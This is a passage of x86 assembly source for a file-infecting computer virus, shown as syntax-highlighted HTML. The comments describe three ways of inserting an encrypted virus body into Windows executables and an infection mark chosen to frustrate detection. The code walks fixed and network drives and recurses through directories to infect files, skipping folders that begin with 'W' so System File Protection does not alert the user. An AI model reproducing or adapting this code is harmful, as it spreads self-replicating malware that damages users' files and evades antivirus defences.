</span><span class="sc1">;;   We extend the end of the .text section and we shift down the sections</span><span class="sc0">
</span><span class="sc1">;;   under this one. In this way, the decryptor/copier executes in the</span><span class="sc0">
</span><span class="sc1">;;   .text section without overwriting code. The data being encrypted/moved</span><span class="sc0">
</span><span class="sc1">;;   is stored at the beginning of the .data section: again, we shift the</span><span class="sc0">
</span><span class="sc1">;;   sections down but this time extending the size of .data and all the</span><span class="sc0">
</span><span class="sc1">;;   bytes stored here are shifted down.</span><span class="sc0">
</span><span class="sc1">;;   To make this, all the offset references to points of the executable that</span><span class="sc0">
</span><span class="sc1">;;   are going to be shifted down must be updated: we do that with the help</span><span class="sc0">
</span><span class="sc1">;;   of the .reloc section.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 2) Midinsertion of the decryptor, data at last section</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   If we cannot make the first infection method we pass to this one. We</span><span class="sc0">
</span><span class="sc1">;;   look for holes in the section padding (virtual or physical holes),</span><span class="sc0">
</span><span class="sc1">;;   calculate the maximum size the decryptor can have there and we insert</span><span class="sc0">
</span><span class="sc1">;;   it. The virus data will be stored at the end of the last section, but</span><span class="sc0">
</span><span class="sc1">;;   without modifying the flags of the section (at least must be readable).</span><span class="sc0">
</span><span class="sc1">;;   In fact, if the section is writable we don't infect that executable.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; 3) All data at last section</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   If there aren't holes between sections or the padding isn't enough big</span><span class="sc0">
</span><span class="sc1">;;   to hold a minimum fixed size, then we make a standard infection: we make</span><span class="sc0">
</span><span class="sc1">;;   the last section bigger and put all the code there (the 29A technique).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The infection mark will be the field of the CRC of the executable. If the</span><span class="sc0">
</span><span class="sc1">;; CRC is 0, the file is already infected. If not, the file is clean and we</span><span class="sc0">
</span><span class="sc1">;; set that field to 0 if we successfully infected the file. Since there are</span><span class="sc0">
</span><span class="sc1">;; lots of files with this field being 0, the detection can't rely on the</span><span class="sc0">
</span><span class="sc1">;; infection mark.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">InfectFiles</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set the directory deepness to 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFiles2</span><span class="sc0">  </span><span class="sc1">; First, the current directory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc5">@@LoopGetDrives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Now set again this to 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Get the logical drives in this computer.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetLogicalDriveStringsA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error2</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; Get the type of drive. We only infect</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; it if it's DRIVE_FIXED (3) or</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetDriveTypeA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DRIVE_NETWORK (4)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; DRIVE_FIXED</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectDrive</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; DRIVE_NETWORK</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextDrive</span><span class="sc0">


       </span><span class="sc5">@@InfectDrive</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Avoid a sequence of 4 pushes (just in case)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; Set the current directory as the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; drive string returned by the function</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error2</span><span class="sc0">         </span><span class="sc1">; If error, return</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFiles2</span><span class="sc0">   </span><span class="sc1">; Infect the drive.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc5">@@NextDrive</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc5">@@LoopFindNull</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Get the next drive. If we reach to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; a double NULL, then exit (end of</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; drives string).</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopFindNull</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGetDrives</span><span class="sc0">  </span><span class="sc1">; Next drive</span><span class="sc0">
     </span><span class="sc5">@@Error2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFiles</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function is a separated one from above to allow recursivity. When we</span><span class="sc0">
</span><span class="sc1">;; infect a directory, we can get more directories in the file listing, so</span><span class="sc0">
</span><span class="sc1">;; we set that directory as the current and we call this function again (but</span><span class="sc0">
</span><span class="sc1">;; first increasing the directory deepness to avoid infecting all the drive</span><span class="sc0">
</span><span class="sc1">;; every execution).</span><span class="sc0">
</span><span class="sc5">InfectFiles2</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OtherBuffers</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc0">     </span><span class="sc1">; Get all files</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFindFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@TouchAgain</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Check if it's a directory</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TryToInfectFile</span><span class="sc0">   </span><span class="sc1">; If it isn't, jump to try to infect</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; If we are too deep in recursivity</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">    </span><span class="sc1">; just ignore the directory.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFh</span><span class="sc0">     </span><span class="sc1">; See if the directory name is ".."</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">    </span><span class="sc1">; If it is, ignore it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; Is it "."?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">    </span><span class="sc1">; Then, ignore it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'W'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">  </span><span class="sc1">; Do the name begins with "W"?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">    </span><span class="sc1">; Then, ignore it. In this way we</span><span class="sc0">
                                      </span><span class="sc1">; avoid infecting files in the Windows</span><span class="sc0">
                                      </span><span class="sc1">; directory (and the action of the SFP</span><span class="sc0">
                                      </span><span class="sc1">; noticing the user).</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">      </span><span class="sc1">; Set the directory as the current.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; If we couldn't, find next file</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Increase the directory recurs.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFindFile</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Save the FileFind handle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFiles2</span><span class="sc0">          </span><span class="sc1">; Calling me from my guts!</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFindFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Restore the FileFind handle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Decrease the directory deepness</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectoryDeepness</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc0">          </span><span class="sc1">; Set as current the directory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; above in the tree. Doing this</span><span class="sc0">
                                      </span><span class="sc1">; we avoid to save everytime the name</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; of the directory we came from.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Set ".." as the current directory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error2</span><span class="sc0">         </span><span class="sc1">; If error, just finish the infection</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InfectNextFile</span><span class="sc0"> </span><span class="sc1">; If no error, continue</span><span class="sc0">

    </span><span class="sc1">;; Here if we found a file</span><span class="sc0">
     </span><span class="sc5">@@TryToInfectFile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0">
                </span><span class="sc1">;call    RandomBoolean  ; WEIGHT_X000</span><span class="sc0">
